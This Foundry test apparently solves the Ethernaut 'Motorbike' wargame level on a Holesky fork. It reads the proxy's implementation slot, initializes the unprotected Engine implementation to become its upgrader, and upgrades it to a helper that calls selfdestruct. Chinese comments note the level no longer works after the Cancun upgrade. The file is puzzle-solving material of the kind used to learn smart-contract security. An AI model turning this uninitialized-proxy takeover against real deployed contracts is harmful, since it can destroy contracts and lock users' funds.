// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";

// 试题是0.6.0版本的，这里直接写interface不用源码合约
// 另外坎昆升级之后这道题其实就解不了了，因为selfdestruct不再会真正的销毁代码（除非在construtor里），从而合约地址的size永远无法变为0
interface Engine {
    function initialize() external;

    function upgrader() external view returns (address);

    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable;
}

contract MotorbikeAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;

        vm.startPrank(playerAddress);
        address engineAddress = address(
            uint160(
                uint256(
                    vm.load(
                        0xbaD5214d357B1d6DeE0039EfE98EB2c412F532F4,
                        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
                    )
                )
            )
        );
        Helper helper = new Helper();
        helper.attack(engineAddress);

        vm.stopPrank();
        uint256 size;
        assembly {
            size := extcodesize(engineAddress)
        }
        console.log(size);
        assertTrue(size == 0);
    }
}

contract Helper {
    function attack(address engineAddress) external {
        Engine engine = Engine(engineAddress);
        engine.initialize();
        engine.upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("kill()")
        );
        console.log(engine.upgrader());
        console.log(address(this));
    }

    function kill() public {
        selfdestruct(payable(0xB3D6fac08D421164A414970D5225845b3A91F33F));
    }
}
